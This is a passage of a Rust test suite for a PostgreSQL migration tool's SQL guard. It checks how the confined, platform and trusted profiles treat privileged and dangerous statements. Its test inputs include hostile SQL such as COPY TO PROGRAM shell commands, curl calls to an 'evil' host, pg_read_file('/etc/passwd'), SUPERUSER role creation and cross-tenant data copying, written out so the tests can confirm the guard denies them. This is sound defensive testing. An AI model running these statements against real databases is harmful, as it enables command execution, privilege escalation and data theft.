            ("confined", confined_guard(), confined),
            ("platform", platform_guard(), platform),
            ("trusted", trusted_guard(), trusted),
        ];
        for (profile, guard, expected) in profiles {
            let got = decision_of(&guard, sql);
            assert_eq!(
                got, expected,
                "{site} behavior lock changed for {profile}: {sql}"
            );
        }
    }

    #[test]
    fn m2_stage2_site_459_belt_skip_behavior_lock() {
        assert_profile_decisions(
            "site :459 belt-skip",
            "COPY zeroship.t TO PROGRAM 'sh -c id'",
            GuardDecision::Denied(rule::COPY_PROGRAM),
            GuardDecision::Denied(rule::COPY_PROGRAM),
            GuardDecision::Allow,
        );
    }

    #[test]
    fn m2_stage2_site_655_create_role_behavior_lock() {
        assert_profile_decisions(
            "site :655 create role",
            "CREATE ROLE zeroship_auth NOLOGIN",
            GuardDecision::Denied(rule::ROLE_MANAGEMENT),
            GuardDecision::Allow,
            GuardDecision::Allow,
        );
    }

    #[test]
    fn m2_stage2_site_664_alter_role_behavior_lock() {
        assert_profile_decisions(
            "site :664 alter role",
            "ALTER ROLE zeroship_auth LOGIN",
            GuardDecision::Denied(rule::ROLE_MANAGEMENT),
            GuardDecision::Allow,
            GuardDecision::Allow,
        );
    }

    #[test]
    fn m2_stage2_site_670_role_set_and_drop_behavior_lock() {
        for sql in [
            "ALTER ROLE oauth_hydra SET search_path = zeroship, public",
            "DROP ROLE IF EXISTS oauth_hydra",
        ] {
            assert_profile_decisions(
                "site :670 alter role set / drop role",
                sql,
                GuardDecision::Denied(rule::ROLE_MANAGEMENT),
                GuardDecision::Allow,
                GuardDecision::Allow,
            );
        }
    }

    #[test]
    fn m2_stage2_site_682_grant_stmt_behavior_lock() {
        assert_profile_decisions(
            "site :682 grant stmt",
            "GRANT CONNECT ON DATABASE zeroship TO oauth_hydra",
            GuardDecision::Denied(rule::PRIVILEGE_MANAGEMENT),
            GuardDecision::Allow,
            GuardDecision::Allow,
        );
    }

    #[test]
    fn m2_stage2_site_691_grant_role_stmt_behavior_lock() {
        assert_profile_decisions(
            "site :691 grant role stmt",
            "GRANT zeroship_app TO oauth_hydra",
            GuardDecision::Denied(rule::PRIVILEGE_MANAGEMENT),
            GuardDecision::Allow,
            GuardDecision::Allow,
        );
    }

    #[test]
    fn m2_stage2_site_700_alter_default_privileges_behavior_lock() {
        assert_profile_decisions(
            "site :700 alter default privileges",
            "ALTER DEFAULT PRIVILEGES IN SCHEMA zeroship GRANT SELECT ON TABLES TO zeroship_app",
            GuardDecision::Denied(rule::PRIVILEGE_MANAGEMENT),
            GuardDecision::Allow,
            GuardDecision::Allow,
        );
    }

    #[test]
    fn m2_stage2_site_798_drop_stmt_behavior_lock() {
        for sql in [
            "DROP POLICY IF EXISTS tenant_isolation ON zeroship.app_secrets",
            "DROP SCHEMA IF EXISTS oauth_hydra CASCADE",
            "DROP EXTENSION IF EXISTS citext",
        ] {
            assert_profile_decisions(
                "site :798 platform drop object set",
                sql,
                GuardDecision::Denied(rule::UNRECOGNIZED_DANGEROUS),
                GuardDecision::Allow,
                GuardDecision::Allow,
            );
        }
    }

    #[test]
    fn m2_stage2_site_821_create_schema_behavior_lock() {
        assert_profile_decisions(
            "site :821 create schema",
            "CREATE SCHEMA IF NOT EXISTS oauth_hydra",
            GuardDecision::Denied(rule::UNRECOGNIZED_DANGEROUS),
            GuardDecision::Allow,
            GuardDecision::Allow,
        );
    }

    #[test]
    fn m2_stage2_site_829_create_policy_behavior_lock() {
        assert_profile_decisions(
            "site :829 create policy",
            "CREATE POLICY tenant_isolation ON zeroship.app_secrets USING (true)",
            GuardDecision::Denied(rule::UNRECOGNIZED_DANGEROUS),
            GuardDecision::Allow,
            GuardDecision::Allow,
        );
    }

    #[test]
    fn m2_stage2_site_836_drop_owned_behavior_lock() {
        assert_profile_decisions(
            "site :836 drop owned",
            "DROP OWNED BY zeroship_auth",
            GuardDecision::Denied(rule::UNRECOGNIZED_DANGEROUS),
            GuardDecision::Allow,
            GuardDecision::Allow,
        );
    }

    #[test]
    fn m2_stage2_site_900_rls_alter_table_behavior_lock() {
        assert_profile_decisions(
            "site :900 RLS alter table",
            "ALTER TABLE zeroship.app_secrets ENABLE ROW LEVEL SECURITY",
            GuardDecision::Denied(rule::UNSAFE_ALTER_TABLE_CMD),
            GuardDecision::Allow,
            GuardDecision::Allow,
        );
    }

    #[test]
    fn m2_stage2_site_1209_body_role_needles_behavior_lock() {
        assert_profile_decisions(
            "site :1209 body role needles",
            "DO $$ BEGIN PERFORM 'create role hidden'; END $$",
            GuardDecision::Denied(rule::ROLE_MANAGEMENT),
            GuardDecision::Allow,
            GuardDecision::Allow,
        );
    }

    #[test]
    fn m2_stage2_site_1209_raw_island_body_backstop_behavior_lock() {
        let body = "BEGIN PERFORM 'not sql create role hidden'; PERFORM 'touch search_path'; END;";
        assert_eq!(
            raw_body_backstop_decision(&confined_guard_config(), body),
            GuardDecision::Denied(rule::BODY_INSPECTION),
            "Confined raw-island body backstop must deny role/search_path needles"
        );
        assert_eq!(
            raw_body_backstop_decision(&platform_guard_config(), body),
            GuardDecision::Allow,
            "Platform is the only posture whose body-token backstop relaxes role/search_path needles"
        );
        assert_eq!(
            raw_body_backstop_decision(&trusted_guard_config(), body),
            GuardDecision::Denied(rule::BODY_INSPECTION),
            "Trusted raw-island body backstop must match the pre-refactor non-Platform decision"
        );

        let cfg = trusted_guard_config();
        let author = trusted_author();
        let op = crate::model::ir::Op::CreateFunction {
            name: "raw_body_role_needles".into(),
            schema: Some("public".into()),
            args: None,
            returns: "void".into(),
            language: crate::model::ir::FuncLanguage::Plpgsql,
            replace: Some(true),
            volatility: None,
            body: body.into(),
        };

        match author.lower_guarded(
            &vendor_ir(op),
            &cfg,
            &crate::render::lower::LiveSchema::default(),
        ) {
            Err(crate::render::lower::IrGuardedLowerError::Denied(denial)) => {
                assert_eq!(denial.op_kind, "createFunction");
                assert!(
                    matches!(
                        denial.source,
                        GuardError::Denied {
                            rule: rule::BODY_INSPECTION,
                            ..
                        }
                    ),
                    "Trusted createFunction must route through the raw-island body backstop, got {:?}",
                    denial.source
                );
            }
            other => panic!(
                "Trusted createFunction role/search_path body must be denied through lower_guarded; got {other:?}"
            ),
        }
    }

    #[test]
    fn m2_stage2_superuser_belt_sites_stay_hard_denied() {
        for (site, sql, expected_rule) in [
            (
                "site :651 create role SUPERUSER",
                r#"CREATE ROLE "evil" SUPERUSER"#,
                rule::SUPERUSER_ROLE,
            ),
            (
                "site :661 alter role SUPERUSER",
                r#"ALTER ROLE "evil" SUPERUSER"#,
                rule::SUPERUSER_ROLE,
            ),
            (
                "site :1201 body SUPERUSER token scan",
                r#"DO $$ BEGIN EXECUTE format('ALTER ROLE %I SUPERUSER', 'evil'); END $$"#,
                rule::BODY_INSPECTION,
            ),
        ] {
            for (profile, guard) in [
                ("confined", confined_guard()),
                ("platform", platform_guard()),
            ] {
                let got = decision_of(&guard, sql);
                assert_eq!(
                    got,
                    GuardDecision::Denied(expected_rule),
                    "{site} must stay hard-denied under {profile}: {sql}"
                );
            }
        }
    }

    // ---- M3: extract_string_literals is UTF-8-faithful ---------------------

    /// The body token-scan backstop's literal extractor must preserve multi-byte
    /// UTF-8 verbatim. Pre-fix it built each literal via `bytes[j] as char`, which
    /// truncates every non-ASCII byte to a Latin-1 codepoint — corrupting the
    /// literal and potentially splitting a dangerous token off from its adjacent
    /// multi-byte char so the word-scan misses it. This pins faithful extraction.
    #[test]
    fn m3_extract_string_literals_preserves_multibyte_utf8() {
        // A literal with a multi-byte char (`é`, `λ`, `→`, `名`) directly adjacent to
        // a dangerous token (`pg_read_file`). Faithful extraction must yield the
        // exact bytes; the byte-cast bug would mangle each multi-byte char.
        let body = "EXECUTE 'café λ pg_read_file 名→ done'";
        let got = extract_string_literals(body);
        assert_eq!(
            got,
            vec!["café λ pg_read_file 名→ done".to_string()],
            "literal must be extracted byte-for-byte (no Latin-1 truncation)"
        );
        // The dangerous token survives as a whole word adjacent to the multi-byte
        // chars — so the backstop's word_present scan can still find it.
        assert!(
            word_present(&got[0], "pg_read_file"),
            "pg_read_file must remain findable in the faithfully-extracted literal"
        );
        // A standalone multi-byte literal round-trips exactly.
        assert_eq!(
            extract_string_literals("'日本語'"),
            vec!["日本語".to_string()]
        );
    }

    // ---- T11: capability minting uses named seams --------------------------

    /// The capability type is constructible from the in-crate test seam. The
    /// production mints are named seams (`command::runner` for CLI configs and
    /// `model::capability::mint_shadow_operator_capability` for shadow dry-runs);
    /// `for_test` is `#[cfg(test)]`-gated.
    #[test]
    fn t11_platform_capability_mints_only_via_runner_seam() {
        let cap = OperatorCapability::for_test();
        // The token grants a Platform GuardConfig + ExecutorConfig.
        let gcfg = GuardConfig::platform(&cap, vec!["zeroship".into()], vec![]);
        assert_eq!(gcfg.trust(), TrustProfile::Platform);
        let ecfg = crate::conn::ExecutorConfig::platform(
            &cap,
            "platform",
            "zeroship",
            vec!["zeroship".into()],
            vec![],
        );
        assert_eq!(ecfg.guard_config().trust(), TrustProfile::Platform);
        // NOTE: `OperatorCapability::new` is crate-private. Production code uses
        // named mint seams; tests use the `#[cfg(test)] for_test` seam. The
        // external un-nameability is pinned by tests/trybuild_* (T8).
    }

    // ---- T4: Platform widening is correct AND bounded ----------------------

    #[test]
    fn t4_platform_allows_privileged_constructs() {
        let g = platform_guard();
        let allowed = [
            // role mgmt
            "CREATE ROLE zeroship_auth NOLOGIN",
            "ALTER ROLE oauth_hydra SET search_path = oauth_hydra, public",
            "ALTER ROLE oauth_hydra RESET search_path",
            "DROP ROLE IF EXISTS oauth_hydra",
            // grant / privilege mgmt
            "GRANT CONNECT ON DATABASE zeroship TO oauth_hydra",
            "GRANT USAGE ON SCHEMA public TO oauth_hydra",
            "REVOKE USAGE ON SCHEMA public FROM oauth_hydra",
            "ALTER DEFAULT PRIVILEGES IN SCHEMA zeroship GRANT SELECT ON TABLES TO zeroship_app",
            // schema
            "CREATE SCHEMA IF NOT EXISTS oauth_hydra AUTHORIZATION oauth_hydra",
            "DROP SCHEMA IF EXISTS oauth_hydra CASCADE",
            // RLS — the four toggles
            "ALTER TABLE zeroship.app_secrets ENABLE ROW LEVEL SECURITY",
            "ALTER TABLE zeroship.app_secrets FORCE ROW LEVEL SECURITY",
            "ALTER TABLE zeroship.app_secrets NO FORCE ROW LEVEL SECURITY",
            "ALTER TABLE zeroship.app_secrets DISABLE ROW LEVEL SECURITY",
            // policy
            "CREATE POLICY tenant_isolation ON zeroship.app_secrets \
             USING (app_id = current_setting('zeroship.tenant_app', true)::uuid)",
            "DROP POLICY IF EXISTS tenant_isolation ON zeroship.app_secrets",
            // extensions (allowlisted under Platform)
            "CREATE EXTENSION citext",
            "CREATE EXTENSION IF NOT EXISTS \"uuid-ossp\" WITH SCHEMA oauth_hydra",
            "DROP EXTENSION IF EXISTS \"uuid-ossp\"",
            // DROP OWNED BY (0025 rollback)
            "DROP OWNED BY zeroship_auth",
            // cross-schema references within the allowlist
            "CREATE TABLE oauth_hydra.clients(id int primary key)",
            "INSERT INTO public.t SELECT * FROM zeroship.app_secrets",
        ];
        for sql in allowed {
            assert!(
                g.check(sql).is_ok(),
                "Platform should ALLOW but DENIED: {sql}\n  got: {:?}",
                g.check(sql)
            );
        }
    }

    #[test]
    fn t4_platform_still_denies_rce_and_host_escape() {
        let g = platform_guard();
        let denied = [
            // RCE / host escape — kept hard in BOTH profiles
            "COPY zeroship.t TO PROGRAM 'sh -c \"curl evil\"'",
            "COPY zeroship.t FROM '/etc/passwd'",
            "SELECT pg_read_file('/etc/passwd')",
            "CREATE EXTENSION dblink",
            "CREATE EXTENSION postgres_fdw",
            "CREATE FUNCTION zeroship.f() RETURNS void AS 'x' LANGUAGE plpythonu",
            "ALTER SYSTEM SET wal_level = minimal",
            "CREATE FUNCTION zeroship.g() RETURNS int LANGUAGE sql SECURITY DEFINER AS $$ SELECT 1 $$",
            "LOAD 'evil.so'",
            // cross-schema to a NON-allowlisted (creator) schema
            "CREATE TABLE proj_acme.steal(id int)",
            "INSERT INTO proj_acme.t SELECT * FROM zeroship.app_secrets",
        ];
        for sql in denied {
            assert!(
                is_denied(&g, sql),
                "Platform should STILL DENY but it passed: {sql}\n  got: {:?}",
                g.check(sql)
            );
        }
    }

    // ---- T4b: DO-block privileged DDL under Platform (C2 body widening) -----

    /// 0025's bootstrap shape: a DO block whose EXECUTE literals CREATE ROLE /
    /// ALTER ROLE … SET search_path / GRANT. ALLOWED under Platform (both the
    /// recursion arm and the relaxed token-scan), DENIED under Confined.
    const BOOTSTRAP_DO: &str = "DO $bootstrap$
        BEGIN
            EXECUTE 'CREATE ROLE zeroship_app NOLOGIN';
            EXECUTE 'ALTER ROLE zeroship_app SET search_path = zeroship, public';
            EXECUTE 'GRANT USAGE ON SCHEMA zeroship TO zeroship_app';
        END
        $bootstrap$;";

    /// 0027's shape: a DO block with a bare (parsed) CREATE ROLE inside.
    const HYDRA_DO: &str = "DO $$
        BEGIN
            IF NOT EXISTS (SELECT FROM pg_roles WHERE rolname = 'oauth_hydra') THEN
                CREATE ROLE oauth_hydra LOGIN PASSWORD 'zeroship';
            END IF;
        END
        $$;";

    #[test]
    fn t4b_do_block_privileged_ddl_applies_under_platform() {
        let g = platform_guard();
        assert!(
            g.check(BOOTSTRAP_DO).is_ok(),
            "0025 bootstrap DO should pass under Platform: {:?}",
            g.check(BOOTSTRAP_DO)
        );
        assert!(
            g.check(HYDRA_DO).is_ok(),
            "0027 hydra DO should pass under Platform: {:?}",
            g.check(HYDRA_DO)
        );
    }

    #[test]
    fn t4b_neg_do_block_privileged_ddl_denied_under_confined() {
        let g = confined_guard();
        assert!(is_denied(&g, BOOTSTRAP_DO), "0025 bootstrap DO must DENY under Confined");
        assert!(is_denied(&g, HYDRA_DO), "0027 hydra DO must DENY under Confined");
    }

    #[test]
    fn t4b_neg_do_block_rce_denied_even_under_platform() {
        let g = platform_guard();
        let rce_do = "DO $$ BEGIN
            EXECUTE 'COPY zeroship.t FROM PROGRAM ''curl http://evil''';
        END $$;";
        assert!(
            is_denied(&g, rce_do),
            "COPY…PROGRAM in a body MUST deny even under Platform"
        );
    }

    // ---- HIGH-2 (vendor-pg review): SUPERUSER is host-reaching, denied even
    // under Platform (vendor spec §3.4). RED pre-fix: the CreateRoleStmt arm
    // returned Ok(()) unconditionally under Platform, so `CREATE ROLE x
    // SUPERUSER` PASSED — a render-here-refuse-at-guard backstop that did not
    // actually refuse. ----------------------------------------------------------

    #[test]
    fn superuser_role_denied_even_under_platform() {
        let g = platform_guard();
        // A plain role create is fine under Platform (the platform mints roles).
        assert!(
            g.check(r#"CREATE ROLE "zeroship_auth" LOGIN"#).is_ok(),
            "a non-superuser CREATE ROLE must still pass under Platform: {:?}",
            g.check(r#"CREATE ROLE "zeroship_auth" LOGIN"#)
        );
        // But SUPERUSER reaches the host — denied even under Platform, with the
        // dedicated rule id (NOT the generic role_management, which Platform
        // relaxes).
        for sql in [
            r#"CREATE ROLE "evil" SUPERUSER"#,
            r#"CREATE ROLE "evil" LOGIN SUPERUSER BYPASSRLS"#,
            r#"ALTER ROLE "zeroship_auth" SUPERUSER"#,
        ] {
            match g.check(sql) {
                Err(GuardError::Denied { rule: r, .. }) => assert_eq!(
                    r,
                    rule::SUPERUSER_ROLE,
                    "SUPERUSER must deny with the superuser_role rule, got rule={r} for {sql}"
                ),
                other => panic!("SUPERUSER must be DENIED even under Platform; got {other:?} for {sql}"),
            }
        }
        // NOSUPERUSER (the negative attribute) is not an escalation — it passes.
        assert!(
            g.check(r#"CREATE ROLE "zeroship_auth" NOSUPERUSER LOGIN"#).is_ok(),
            "NOSUPERUSER must not trip the superuser deny"
        );
    }

    #[test]
    fn superuser_role_in_if_not_exists_do_wrap_denied_even_under_platform() {
        let g = platform_guard();
        let sql = r#"DO $$ BEGIN
            IF NOT EXISTS (SELECT 1 FROM pg_roles WHERE rolname = 'evil') THEN
                CREATE ROLE "evil" SUPERUSER;
            END IF;
        END $$"#;

        match g.check(sql) {
            Err(GuardError::Denied { rule: r, .. }) => assert!(
                r == rule::SUPERUSER_ROLE || r == rule::BODY_INSPECTION,
                "DO-wrapped SUPERUSER must deny via superuser/body rule, got rule={r}"
            ),
            other => panic!("DO-wrapped SUPERUSER must be DENIED under Platform; got {other:?}"),
        }
    }

    #[test]
    fn vendor_if_not_exists_superuser_role_op_is_refused_under_platform() {
        let guard_cfg = platform_guard_config();
        let author = platform_author(&guard_cfg);
        let op = crate::model::ir::Op::CreateRole {
            name: "evil".into(),
            login: Some(true),
            password: None,
            bypass_rls: None,
            create_role: None,
            create_db: None,
            superuser: Some(true),
            in_role: None,
            set_search_path: None,
            if_not_exists: Some(true),
        };

        match author.lower_guarded(
            &vendor_ir(op),
            &guard_cfg,
            &crate::render::lower::LiveSchema::default(),
        ) {
            Err(_) => {}
            Ok((_steps, fragments)) => panic!(
                "vendor createRole(superuser + ifNotExists) must be refused; got fragments={fragments:?}"
            ),
        }
    }

    #[test]
    fn superuser_role_in_platform_do_body_token_scan_is_denied() {
        let g = platform_guard();
        let sql = r"DO $$ BEGIN
            EXECUTE format('ALTER ROLE %I SUPERUSER', 'zeroship_auth');
        END $$";

        match g.check(sql) {
            Err(GuardError::Denied { rule: r, .. }) => assert!(
                r == rule::SUPERUSER_ROLE || r == rule::BODY_INSPECTION,
                "DO body SUPERUSER token must deny via superuser/body rule, got rule={r}"
            ),
            other => panic!("DO body SUPERUSER token must be DENIED under Platform; got {other:?}"),
        }
    }

    #[test]
    fn guard_statement_json_serialization_error_fails_closed() {
        struct BadSerialize;

        impl serde::Serialize for BadSerialize {
            fn serialize<S>(&self, _serializer: S) -> Result<S::Ok, S::Error>
            where
                S: serde::Serializer,
            {
                Err(serde::ser::Error::custom("forced serialization failure"))
            }
        }

        assert!(
            serde_json::to_value(&BadSerialize).is_err(),
            "test precondition: BadSerialize must fail JSON serialization"
        );
        assert!(
            guard_stmt_json(&BadSerialize, "SELECT 1").is_err(),
            "guard must deny-by-default on statement JSON serialization failure"
        );
    }

    // ---- CRITICAL (2026-06 adversarial review #1): host-reaching built-in role
    // membership grants are RCE-equivalent and remain denied under Platform. RED
    // pre-fix: the GrantStmt/GrantRoleStmt arm returned Ok(()) immediately for
    // Platform, so `GRANT pg_execute_server_program TO …` passed.

    #[test]
    fn host_escape_role_grant_denied_even_under_platform() {
        let g = platform_guard();
        assert!(
            g.check(r"GRANT SELECT ON TABLE zeroship.app_secrets TO zeroship_app")
                .is_ok(),
            "benign table GRANT must still pass under Platform"
        );

        for sql in [
            r"GRANT pg_execute_server_program TO zeroship_app",
            r#"GRANT "pg_read_server_files" TO zeroship_app"#,
            r"GRANT zeroship_app TO pg_write_server_files",
        ] {
            assert!(
                is_denied(&g, sql),
                "host-reaching built-in role membership grant must be DENIED even under Platform: {sql}"
            );
        }
    }

    // ---- HIGH-1 (vendor-pg review): raw vendor bodies still hit gate 2 ----

    #[test]
    fn vendor_create_function_body_rce_is_denied_under_platform_guard() {
        let guard_cfg = platform_guard_config();
        let author = platform_author(&guard_cfg);
        let op = crate::model::ir::Op::CreateFunction {
            name: "audit_events_rce".into(),
            schema: Some("zeroship".into()),
            args: None,
            returns: "void".into(),
            language: crate::model::ir::FuncLanguage::Plpgsql,
            replace: Some(true),
            volatility: None,
            body: "BEGIN COPY zeroship.audit_events TO PROGRAM 'sh -c id'; END;".into(),
        };

        match author.lower_guarded(
            &vendor_ir(op),
            &guard_cfg,
            &crate::render::lower::LiveSchema::default(),
        ) {
            Err(crate::render::lower::IrGuardedLowerError::Denied(denial)) => {
                assert_eq!(denial.op_kind, "createFunction");
                assert!(
                    matches!(
                        denial.source,
                        GuardError::Denied {
                            rule: rule::BODY_INSPECTION,
                            ..
                        }
                    ),
                    "the PL/pgSQL body must be scanned, got: {:?}",
                    denial.source
                );
            }
            other => panic!(
                "vendor createFunction with COPY PROGRAM in its body must be denied; got {other:?}"
            ),
        }
    }

    #[test]
    fn vendor_create_function_benign_body_is_allowed_under_platform_guard() {
        let guard_cfg = platform_guard_config();
        let author = platform_author(&guard_cfg);
        let op = crate::model::ir::Op::CreateFunction {
            name: "audit_events_note".into(),
            schema: Some("zeroship".into()),
            args: None,
            returns: "void".into(),
            language: crate::model::ir::FuncLanguage::Plpgsql,
            replace: Some(true),
            volatility: None,
            body: "BEGIN RAISE NOTICE 'ok'; RETURN; END;".into(),
        };

        let (_steps, fragments) = author
            .lower_guarded(
                &vendor_ir(op),
                &guard_cfg,
                &crate::render::lower::LiveSchema::default(),
            )
            .expect("benign vendor createFunction body must pass the Platform guard");
        assert_eq!(fragments.len(), 1);
        assert_eq!(fragments[0].op_kind, "createFunction");
        assert!(
            fragments[0].sql.contains("RAISE NOTICE 'ok'"),
            "the guarded fragment should be the rendered function statement: {:?}",
            fragments[0]
        );
    }

    #[test]
    fn vendor_pg_raw_rce_is_denied_under_platform_guard() {
        let guard_cfg = platform_guard_config();
        let author = platform_author(&guard_cfg);
        let op = crate::model::ir::Op::PgRaw {
            sql: "COPY zeroship.audit_events TO PROGRAM 'sh -c id'".into(),
            binds: Vec::new(),
        };

        match author.lower_guarded(
            &vendor_ir(op),
            &guard_cfg,
            &crate::render::lower::LiveSchema::default(),
        ) {
            Err(crate::render::lower::IrGuardedLowerError::Denied(denial)) => {
                assert_eq!(denial.op_kind, "pgRaw");
                assert!(
                    matches!(
                        denial.source,
                        GuardError::Denied {
                            rule: rule::COPY_PROGRAM,
                            ..
                        }
                    ),
                    "pgRaw COPY PROGRAM should be caught by the AST deny-list, got: {:?}",
                    denial.source
                );
            }
            other => panic!("vendor pgRaw COPY PROGRAM must be denied; got {other:?}"),
        }
    }

    #[test]
    fn vendor_role_op_is_refused_at_lower_without_platform_capability() {
        let guard_cfg = GuardConfig::confined("zeroship");
        let author = crate::render::lower::IrAuthor::new(
            "zeroship",
            "app_corpus",
            SqlDialect::Postgres,
        );
        let op = crate::model::ir::Op::CreateRole {
            name: "zeroship_auth".into(),
            login: Some(true),
            password: None,
            bypass_rls: None,
            create_role: None,
            create_db: None,
            superuser: None,
            in_role: None,
            set_search_path: None,
            if_not_exists: None,
        };

        match author.lower_guarded(
            &vendor_ir(op),
            &guard_cfg,
            &crate::render::lower::LiveSchema::default(),
        ) {
            Err(crate::render::lower::IrGuardedLowerError::Lower(
                crate::render::lower::IrLowerError::VendorCapabilityDenied {
                    op,
                    capability,
                },
            )) => {
                assert_eq!(op, "createRole");
                assert_eq!(capability, crate::model::capability::VendorCapability::Role);
            }
            other => panic!(
                "vendor createRole must be refused at lower without Platform capability; got {other:?}"
            ),
        }
    }

    #[test]
    fn benign_vendor_policy_is_refused_at_lower_without_capability() {
        let guard_cfg = GuardConfig::confined("zeroship");
        let author =
            crate::render::lower::IrAuthor::new("zeroship", "app_corpus", SqlDialect::Postgres);
        let op = crate::model::ir::Op::CreatePolicy {
            name: "tenant_isolation".into(),
            table: "app_secrets".into(),
            schema: None,
            for_cmd: crate::model::ir::PolicyCmd::All,
            to: None,
            using: crate::model::expr::Expr::Literal {
                value: crate::model::ir::IrScalar::Bool(true),
            },
            with_check: None,
        };

        assert!(
            matches!(
                author.lower_guarded(
                    &vendor_ir(op),
                    &guard_cfg,
                    &crate::render::lower::LiveSchema::default(),
                ),
                Err(crate::render::lower::IrGuardedLowerError::Lower(_))
            ),
            "lower_guarded must re-enforce the vendor capability gate before rendering; \
             the SQL guard alone would allow a benign same-schema CREATE POLICY"
        );
    }

    // ---- T2: SchemaScope Single is byte-identical at the read sites ---------

    #[test]
    fn t2_func_def_target_single_is_byte_identical() {
        let g = confined_guard(); // Single("zeroship")
        // own-schema funcname → OK; foreign funcname → CrossSchema.
        assert!(g
            .check("CREATE FUNCTION zeroship.f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$")
            .is_ok());
        assert!(matches!(
            g.check("CREATE FUNCTION public.f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$"),
            Err(GuardError::CrossSchema { .. })
        ));
        assert!(matches!(
            g.check("ALTER FUNCTION control.f() IMMUTABLE"),
            Err(GuardError::CrossSchema { .. })
        ));
    }

    #[test]
    fn t2_literal_schema_refs_single_is_byte_identical() {
        let g = confined_guard(); // Single("zeroship")
        assert!(matches!(
            g.check("SELECT 'control.t'::regclass"),
            Err(GuardError::CrossSchema { .. })
        ));
        assert!(matches!(
            g.check("SELECT nextval('control.s')"),
            Err(GuardError::CrossSchema { .. })
        ));
        // own-schema literal ref → OK.
        assert!(g.check("SELECT nextval('zeroship.s')").is_ok());
    }

    #[test]
    fn t2_platform_func_def_and_literal_refs_respect_allowlist() {
        let g = platform_guard(); // Allowlist(zeroship, oauth_hydra, public)
        // allowlisted schema → OK
        assert!(g
            .check("CREATE FUNCTION oauth_hydra.f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$")
            .is_ok());
        assert!(g.check("SELECT nextval('oauth_hydra.s')").is_ok());
        // non-allowlisted (creator) schema → still CrossSchema
        assert!(matches!(
            g.check("SELECT 'proj_acme.t'::regclass"),
            Err(GuardError::CrossSchema { .. })
        ));
    }

    #[test]
    fn schema_scope_permits_is_case_insensitive() {
        assert!(SchemaScope::Single("Zeroship".into()).permits("zeroship"));
        assert!(SchemaScope::Allowlist(vec!["OAuth_Hydra".into()]).permits("oauth_hydra"));
        assert!(!SchemaScope::Single("zeroship".into()).permits("control"));
    }

    // ---- Track A: the Trusted profile (public dbmate-like posture) ---------

    /// A Trusted guard, minted via the same `for_test` operator-token seam.
    fn trusted_guard() -> SqlGuard {
        SqlGuard::new(trusted_guard_config())
    }

    fn trusted_guard_config() -> GuardConfig {
        let cap = OperatorCapability::for_test();
        GuardConfig::trusted(&cap)
    }

    fn trusted_author() -> crate::render::lower::IrAuthor {
        let cfg = trusted_guard_config();
        let scope = cfg
            .schema_scope()
            .expect("Trusted guard carries the explicit unconfined operator scope");
        crate::render::lower::IrAuthor::new("public", "app_corpus", SqlDialect::Postgres)
            .with_schema_scope(scope)
    }

    /// The Trusted early-return SKIPS the deny-list ENTIRELY: SQL the Confined
    /// guard hard-denies (role mgmt, cross-schema, even RCE/host-escape shapes)
    /// passes the GUARD under Trusted (the operator owns the DB — there is no
    /// untrusted boundary; PG itself remains the only authority). This is the
    /// guard-level proof; `db.rs`/`shadow.rs`/`executor.rs` ride on it.
    #[test]
    fn trusted_skips_the_denylist_that_confined_enforces() {
        let trusted = trusted_guard();
        let confined = confined_guard();
        // Each of these is a HARD Confined denial (role mgmt / cross-schema / RCE
        // tokens / host escape). Under Trusted the guard must not deny any.
        let arbitrary = [
            "CREATE ROLE zsmig_arbitrary NOLOGIN",
            "GRANT ALL ON SCHEMA public TO postgres",
            "CREATE TABLE other_schema.t (id int)",
            "ALTER SYSTEM SET wal_level = minimal",
            "COPY t TO PROGRAM 'sh -c id'",
            "SELECT pg_read_file('/etc/passwd')",
            "CREATE EXTENSION dblink",
        ];
        for sql in arbitrary {
            assert!(
                confined.check(sql).is_err(),
                "precondition: Confined must DENY {sql} for this test to be meaningful"
            );
            assert!(
                trusted.check(sql).is_ok(),
                "Trusted must SKIP the deny-list and PASS {sql}\n  got: {:?}",
                trusted.check(sql)
            );
        }
    }

    /// Trusted still DERIVES the destructive flag (classify is trust-independent):
    /// a `DROP TABLE` passes the guard (no deny) but the report is `destructive`
    /// and `flags_for` sets `requires_approval` — so the CLI's `--yes` gate holds.
    #[test]
    fn trusted_still_derives_destructive_flag_at_guard_level() {
        let g = trusted_guard();
        let report = g
            .check("DROP TABLE users")
            .expect("Trusted must not deny a DROP TABLE");
        assert!(report.destructive, "DROP TABLE is destructive under Trusted");
        let flags = flags_for(&report);
        assert!(flags.destructive);
        assert!(
            flags.requires_approval,
            "a destructive op still requires approval (CLI --yes) under Trusted"
        );
    }

    #[test]
    fn trusted_pg_raw_still_runs_raw_island_denylist_backstop() {
        let cfg = trusted_guard_config();
        let author = trusted_author();
        let bad = crate::model::ir::Op::PgRaw {
            sql: "CREATE ROLE zsmig_raw_evil SUPERUSER".into(),
            binds: Vec::new(),
        };

        match author.lower_guarded(
            &vendor_ir(bad),
            &cfg,
            &crate::render::lower::LiveSchema::default(),
        ) {
            Err(crate::render::lower::IrGuardedLowerError::Denied(denial)) => {
                assert_eq!(denial.op_kind, "pgRaw");
                assert!(
                    matches!(
                        denial.source,
                        GuardError::Denied {
                            rule: rule::SUPERUSER_ROLE,
                            ..
                        }
                    ),
                    "Trusted pgRaw must still hit the SUPERUSER deny-list backstop, got {:?}",
                    denial.source
                );
            }
            other => panic!("Trusted pgRaw SUPERUSER must be denied; got {other:?}"),
        }

        let clean = crate::model::ir::Op::PgRaw {
            sql: "SELECT 1".into(),
            binds: Vec::new(),
        };
        author
            .lower_guarded(
                &vendor_ir(clean),
                &cfg,
                &crate::render::lower::LiveSchema::default(),
            )
            .expect("clean Trusted pgRaw should pass the raw-island backstop");
    }

    #[test]
    fn trusted_create_function_body_still_runs_raw_island_denylist_backstop() {
        let cfg = trusted_guard_config();
        let author = trusted_author();
        let bad = crate::model::ir::Op::CreateFunction {
            name: "raw_body_evil".into(),
            schema: Some("public".into()),
            args: None,
            returns: "void".into(),
            language: crate::model::ir::FuncLanguage::Plpgsql,
            replace: Some(true),
            volatility: None,
            body: "BEGIN COPY public.audit_events TO PROGRAM 'sh -c id'; END;".into(),
        };

        match author.lower_guarded(
            &vendor_ir(bad),
            &cfg,
            &crate::render::lower::LiveSchema::default(),
        ) {
            Err(crate::render::lower::IrGuardedLowerError::Denied(denial)) => {
                assert_eq!(denial.op_kind, "createFunction");
                assert!(
                    matches!(
                        denial.source,
                        GuardError::Denied {
                            rule: rule::BODY_INSPECTION,
                            ..
                        }
                    ),
                    "Trusted createFunction body must be scanned, got {:?}",
                    denial.source
                );
            }
